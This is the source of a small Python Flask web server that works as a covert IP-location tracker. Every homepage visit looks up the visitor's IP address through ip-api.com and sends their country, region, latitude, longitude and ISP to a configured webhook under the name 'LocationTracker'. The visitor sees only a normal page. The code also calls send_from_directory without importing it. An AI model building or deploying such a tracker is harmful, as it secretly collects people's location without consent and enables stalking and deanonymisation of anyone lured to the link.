from flask import Flask, request
import requests
import json

app = Flask(__name__)

cfg = json.load(open('.cfg'))

dwebHook = cfg['dwebHook']

def get_geolocation(ip):
    resp = requests.get(f'http://ip-api.com/json/{ip}')
    js = json.loads(resp.content)

    payload = ''
    payload += f"*IP Address*  : `{js['query']}` \n"
    payload += f"*County*      : `{js['country']}`\n"
    payload += f"*Region*      : `{js['regionName']}`\n"
    payload += f"*Latitude*    : `{js['lat']}`\n"
    payload += f"*Longitude*   : `{js['lon']}`\n"
    payload += f"*ISP*         : `{js['isp']}`\n"

    content = {
        "content" : payload,
        "username" : "LocationTracker-Shamen-Vilkern",
        "avatar_url": "https://w0.peakpx.com/wallpaper/189/241/HD-wallpaper-handsome-asta-demon-king.jpg"
    }

    res = requests.post(url = dwebHook, json = content)
    print("[+] Request admitted")


@app.route("/")
def homepage():
    get_geolocation(request.remote_addr)
    return open("./static/index.html").read()

@app.route("/script.js")
def js_script():
    return open("./static/script.js").read()

@app.route("/favicon.ico")
def favicon():
    return send_from_directory('./static', 'favicon.ico')

@app.route("/name=<params>")
def name(params):
    return "<h1>Page home </h1>"


if __name__ == '__main__':
    app.run(debug=False, port=8005, host='0.0.0.0')
